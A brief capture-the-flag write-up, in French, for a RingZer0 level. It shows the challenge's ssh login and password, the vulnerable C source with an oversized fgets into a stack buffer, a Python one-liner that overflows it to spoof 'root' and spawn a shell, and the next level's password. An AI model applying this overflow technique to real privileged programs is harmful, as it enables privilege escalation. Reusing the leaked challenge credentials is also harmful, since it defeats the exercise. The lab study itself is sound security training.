ssh level2@challenges.ringzer0ctf.com -p 10080

Mot de passe: TJyK9lJwZrgqc8nIIF6o


```bash
cat level2.c
```
```c
// Created by Hidden (hidden@undernet.org)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct USER {
	int id;
	char name[32];
	char pass[32];
} u = { 0, "nobody", "Ksdkjkk32avsh" };



int main(int argc, char **argv)
{
	char user[32];
	char pass[32];
	char command[64];
	char *shell[] = { command, 0 };
	char *p;

	printf("Username: ");
	fgets(user, 31, stdin);
	p = strchr(user, '\n');
	if (p)
		*p = '\0';
	if (strcmp(user, u.name))
		return 0;
	printf("Password: ");
	fgets(pass, 31, stdin);
	p = strchr(pass, '\n');
	if (p)
		*p = '\0';
	if (strcmp(pass, u.pass))
		return 0;
	printf("Command: ");
	if (fgets(command, 128, stdin) == NULL)
		return 0;
	p = strchr(command, '\n');
	if (p)
		*p = '\0';
	if (!strcmp(user, "root")) {
		printf("Good job!\n");
		printf("command: %s\n", command);
		setresuid(geteuid(), geteuid(), geteuid());
		execve(shell[0],shell,0);
	}
	else {
		printf("Okay Mr. %s. Dropping priviledges though.\n", user);
		setreuid(getuid(), getuid());
		execve(shell[0],shell,0);
	}
	return 0;
}
```


(python -c 'print "nobody\nKsdkjkk32avsh\n" + "/bin/sh\x00" + "\x90" * (96-len("/bin/sh\x00")) + "root\x00"'; cat) | /levels/level2

On a un shell ouvert, on peut afficher le contenu de .pass

b130hOOfGftXUfmRZlgD